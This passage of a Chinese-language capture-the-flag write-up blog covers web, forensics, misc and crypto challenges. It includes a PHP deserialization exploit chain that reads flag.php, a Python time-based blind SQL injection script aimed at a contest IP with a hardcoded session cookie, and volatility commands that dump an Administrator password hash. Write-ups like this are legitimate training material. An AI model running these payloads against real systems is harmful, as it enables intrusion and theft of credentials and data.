-include &#39;flag.php&#39;;
-class baby 
-{   
-    protected $skyobj;  
-    public $aaa;
-    public $bbb;
-    function __construct() 
-    {      
-        $this-&gt;skyobj = new sec;
-    }  
-    function __toString()      
-    {          
-        if (isset($this-&gt;skyobj))  
-            return $this-&gt;skyobj-&gt;read();      
-    }  
-}  
-
-class cool 
-{    
-    public $filename;     
-    public $nice;
-    public $amzing; 
-    function read()      
-    {   
-        $this-&gt;nice = unserialize($this-&gt;amzing);
-        $this-&gt;nice-&gt;aaa = $sth;
-        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
-        {
-            $file = &quot;./{$this-&gt;filename}&quot;;        
-            if (file_get_contents($file))         
-            {              
-                return file_get_contents($file); 
-            }  
-            else 
-            { 
-                return &quot;you must be joking!&quot;; 
-            }    
-        }
-    }  
-}  
-
-class sec 
-{  
-    function read()     
-    {          
-        return &quot;it&#39;s so sec~~&quot;;      
-    }  
-}  
-
-if (isset($_GET[&#39;data&#39;]))  
-{ 
-    $Input_data = unserialize($_GET[&#39;data&#39;]);
-    echo $Input_data; 
-} 
-else 
-{ 
-    highlight_file(&quot;./index.php&quot;); 
-} 
-?&gt;</code></pre><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p>
-<p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p>
-<p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>class baby 
-{   
-    protected $skyobj;  
-    function __construct() 
-    {      
-    $this-&gt;skyobj = new cool;
-    $this-&gt;skyobj-&gt;amzing = serialize(new sec);
-    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;
-    }  
-
-}
-
-class sec 
-{
-    function read(){}
-}
-
-class cool 
-{ 
-    public $filename;     
-    public $nice;
-    public $amzing; 
-}
-
-
-$test = new baby();
-echo urlencode(serialize($test));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p>
-<p>登陆后盲注</p>
-<p>EXP</p>
-<pre><code>#!/usr/bin/env python
-# encoding: utf-8
-
-import requests
-import time
-
-
-def login(payload):
-    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)
-    # print &quot;[+] %s&quot; % (url)
-    before_time = time.time()
-    cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;}
-    response = requests.get(url, cookies=cookies)
-    # content = response.content
-    after_time = time.time()
-    offset = after_time - before_time
-    # print &quot;[*] Offset : %f&quot; % (offset)
-    if offset &gt; 2.5:
-        return True
-    else:
-        return False
-
-def main():
-    data = &quot;&quot;
-    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
-    for i in range(1, 40, 1):
-        for j in charaters:
-            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j)
-            if login(payload):
-                data += str(j)
-                print &quot;[+] Found : %s&quot; % (data)
-                break
-
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><pre><code>binwalk -e zhu.jpg</code></pre><p>Stegsolve</p>
-<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p>
-<pre><code>volatility imageinfo -f memory #分析操作系统
-volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p>
-<p>得到管理员hash如下：</p>
-<pre><code>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</code></pre><p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p>
-<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p>
-<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
